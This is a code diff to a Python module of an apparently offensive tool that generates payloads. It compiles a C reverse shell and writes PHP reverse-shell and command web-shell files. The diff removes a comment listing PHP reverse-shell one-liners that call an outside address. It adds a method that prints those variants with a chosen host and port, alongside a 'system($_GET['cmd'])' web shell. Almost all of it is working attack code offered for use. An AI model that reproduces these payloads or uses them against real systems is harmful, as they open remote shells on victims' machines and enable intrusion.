@@ -1,4 +1,4 @@
-import os
+import os, sys
 import logging
 from subprocess import Popen, PIPE, check_output
 
@@ -6,7 +6,7 @@ from gpwn.resources import get_path
 from gpwn.exceptions import ShellError
 
 logger = logging.getLogger().getChild(__name__)
-
+printer = logging.getLogger('printer').getChild(__name__)
 
 class Shell:
     def __init__(self, address: str, port: int):
@@ -22,6 +22,9 @@ class Shell:
     def generate_cmd_shell(self):
         logger.error("cmd shell not implemented")
 
+    def print(self):
+        logger.error("no variants available")
+
 
 class C(Shell):
     def __init__(self, address: str, port: int, shell: str):
@@ -34,10 +37,11 @@ class C(Shell):
         shell = "\"%s\"" % self.shell
         port = self.port
         address = "\"%s\"" % self.address
-        path = os.path.join(get_path(), 'shell.c')
+        path = os.path.join(get_path(), 'rhell.c')
         logger.debug("compiling: %s -DREMOTE_ADDR=%s -DREMOTE_PORT=%s -DSHELL=%s", path, address, port, shell)
         pipe = Popen(
-            ["gcc", path, "-o", "shell", "-DREMOTE_ADDR=%s" % address, "-DREMOTE_PORT=%s" % port, "-DSHELL=%s" % shell,
+            ["gcc", path, "-o", "rvs_shell", "-DREMOTE_ADDR=%s" % address, "-DREMOTE_PORT=%s" % port,
+             "-DSHELL=%s" % shell,
              "-Wno-implicit-function-declaration"])
         logger.info("created reverse shell")
 
@@ -53,27 +57,28 @@ class Php(Shell):
         Shell.__init__(self, address=address, port=port)
         self.shell = shell
 
-        '''
-            Variants:
-            
-            php -r '$sock=fsockopen("10.0.0.1",4242);exec("/bin/sh -i <&3 >&3 2>&3");'
-            php -r '$sock=fsockopen("10.0.0.1",4242);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
-            php -r '$sock=fsockopen("10.0.0.1",4242);`/bin/sh -i <&3 >&3 2>&3`;'
-            php -r '$sock=fsockopen("10.0.0.1",4242);system("/bin/sh -i <&3 >&3 2>&3");'
-            php -r '$sock=fsockopen("10.0.0.1",4242);passthru("/bin/sh -i <&3 >&3 2>&3");'
-            php -r '$sock=fsockopen("10.0.0.1",4242);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
-            php -r '$sock=fsockopen("10.0.0.1",4242);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
-        '''
-
     def generate_reverse_shell(self):
-        shell = "<?php $sock=fsockopen(\"%s\",%s);exec(\"%s -i <&3 >&3 2>&3\");?>" % (self.address, self.port, self.shell)
+        shell = "<?php $sock=fsockopen(\"%s\",%s);exec(\"%s -i <&3 >&3 2>&3\");?>" % (
+            self.address, self.port, self.shell)
         with open('shell.php', 'w') as file:
             file.write(shell)
 
-        logger.info("created shell.php")
+        logger.info("created rvs_shell.php")
 
     def generate_cmd_shell(self):
         shell = "<?php system($_GET['cmd']);?>"
         with open('shell.php', 'w') as file:
             file.write(shell)
-        logger.info("created shell.php")
+        logger.info("created cmd_shell.php")
+
+    def print(self):
+        printer.info("*** PHP REVERSE SHELL VARIANTS ***")
+        printer.info('$sock=fsockopen("%s",%s);exec("%s -i <&3 >&3 2>&3");' % (self.address, self.port, self.shell))
+        printer.info(
+            '$sock=fsockopen("%s",%s);shell_exec("%s -i <&3 >&3 2>&3");' % (self.address, self.port, self.shell))
+        printer.info('$sock=fsockopen("%s",%s);`%s -i <&3 >&3 2>&3`;' % (self.address, self.port, self.shell))
+        printer.info('$sock=fsockopen("%s",%s);passthru("%s -i <&3 >&3 2>&3");' % (self.address, self.port, self.shell))
+        printer.info(
+            '$sock=fsockopen("%s",%s);popen("%s -i <&3 >&3 2>&3", "r");' % (self.address, self.port, self.shell))
+        printer.info('$sock=fsockopen("%s",%s);$proc=proc_open("%s -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);' % (
+            self.address, self.port, self.shell))
